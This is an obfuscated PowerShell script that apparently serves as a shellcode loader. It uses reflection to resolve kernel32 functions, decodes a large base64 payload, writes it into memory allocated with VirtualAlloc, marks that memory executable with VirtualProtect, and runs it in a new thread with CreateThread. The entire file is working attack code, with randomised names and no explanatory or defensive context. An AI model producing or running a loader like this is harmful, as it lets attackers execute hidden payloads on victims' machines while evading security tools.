function cWOHz {
        Param ($iGQc, $zvtt)
        $mDxL = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $mDxL.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($mDxL.GetMethod('GetModuleHandle')).Invoke($null, @($iGQc)))), $zvtt))
}

function cF2PG {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $apYWU,
                [Parameter(Position = 1)] [Type] $iYdBH = [Void]
        )

        $pX5 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $pX5.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $apYWU).SetImplementationFlags('Runtime, Managed')
        $pX5.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $iYdBH, $apYWU).SetImplementationFlags('Runtime, Managed')

        return $pX5.CreateType()
}

[Byte[]]$ldPs = [System.Convert]::FromBase64String("v2WlwKbZ7dl0JPRbM8lmuSUBg+v8MXsQAx61IlNY3KbJNMRpKDDfgZCL1gye9ulTC/TbEN8HX4Q9m4Eu0pjcAu/Ed0s5PibslfH6DTrYOhJ20L+cQtfwwPqC9txJ2PHJvMF+ndSdfoTmjy313WvT0/E73tCp+8l/2Hj5Je95hwjEtmeM3kpB9fIXvAgdw0JLTdpccPwLcVBJBrJpt9eTrCzIZfv0Pt2q385DhgXdjF17KhYdP0GnTrr7XX095gdPYPAWP1vPKJ0iRyI4qBdHQjQrmII2Ttv3P1c7NPockEPVR5CePnuzAqYc8zYhGb25s4RK+zRC+J0XQQq9p6Cja5xEFensGuivJRXCWoBzwePhdDTG3uO4kIuPb7r5RPPlMpXbiGIriTAgSVFrfldts4ki5xT45myO4jz05hUKgjsYnotKWJhjLWotUZ+xU00T0U+nX3Im2lUSPM4wG/3qK2BfVVYmAWuPbnPgR6j4lX43LfFWJdrGb+tMHleCcnTzfPbGSu4a85yqY73bfv/Of8iYDkBUb3WQofXlygspYdC8fbYo7mJ/QKWZ5mFXNbjiIiE6Aztw7RyuXtowALdJeiTIntYAid9346PICa0gmA4Ln7rTsjvLoJrN7eqA5sbG/r7pnpmWVDMrX8qxqi4uWqZ6LekwKZYdiZpt3dtzO8kQpQ4LEYw1Ij8xTdNsd8U2g3VNqwmfrlmklpJM+Fy53h5dBC5fssGV1t5VbjLcgPBRKdSHbfilIAW6XN8b7ULzVtzyHp3gTdUkOy0gzh+43oX/l2kRmhKZUdxeNEZZSWthz2u4sclMOrlCVUatuefiSkqHevFt+JGWQH3YXvO1Wf8kJLSX6ONbizt7zlB9JNhiGGXYZV5pP8CfmUSHo/HEnJbxkof/TdzsEvUDQWtb6sTsbHjHNva2jpHHsKXxODHMuJthWFQfteaSUCpL9xWX6DvU5naMW8H/EhVqq86zgb6C6zpj6ebwrS45f+w8+d4lkfD1JQiqhZLA/jaY1b1SOFUZol9z/ryErXOEGH1Z8ghZA6KEEQ+xbqIq6j7bHilxA2V7XDGlz1lLWRbbmk17IiA30oR1bVmh0/0Yi4gG8py68Ad/0iyNT03GB1oKRwKo7wRMesVQPR/u76bthtHukBNNQqJfCBD9tEe2vPlIAdd+whvesKy4wtBo1pFMmwUiCsIHpz3hNoWSbvEq4S+4u8U9ELs0qD34YqXr/jAQIFNBHLZxaPS++Yb36IwjrUqeSgsvXc2Nzpwocjqww7+wEOgt3gvAR6r55XL0caafGynhIi78v6iVJa6DpKYI8MHFR6SxaYgtZROvjATqGFvx6Y7q/KbnCroRvhZDXHjp8zfD98sWn/SISBAaaMyhLL3/h5l4NDQEyhL2/rbYhEx08vqArBqWmKEQ+/L5M3b+Lv094zMKzDtqkI7Fl9SU0kUp05NQ/XKXOauG8BEs0Nrdi+A0RciIc7zN20nkvBK+bgkc6C8ZNqymLnIq3c796eQeECLcBQYfoAW3sUnV5DM+4/7FNqXlm+eFMTuk9e5h10NZXN9X+i5GBgnTis0qRanYhUqOMjJfpYMu+IOW")
[Uint32]$xpQn = 0
$kE = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((cWOHz kernel32.dll VirtualAlloc), (cF2PG @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $ldPs.Length,0x3000, 0x04)

[System.Runtime.InteropServices.Marshal]::Copy($ldPs, 0, $kE, $ldPs.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((cWOHz kernel32.dll VirtualProtect), (cF2PG @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($kE, [Uint32]$ldPs.Length, 0x10, [Ref]$xpQn)) -eq $true) {
        $bC = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((cWOHz kernel32.dll CreateThread), (cF2PG @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$kE,[IntPtr]::Zero,0,[IntPtr]::Zero)
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((cWOHz kernel32.dll WaitForSingleObject), (cF2PG @([IntPtr], [Int32]))).Invoke($bC,0xffffffff) | Out-Null
}
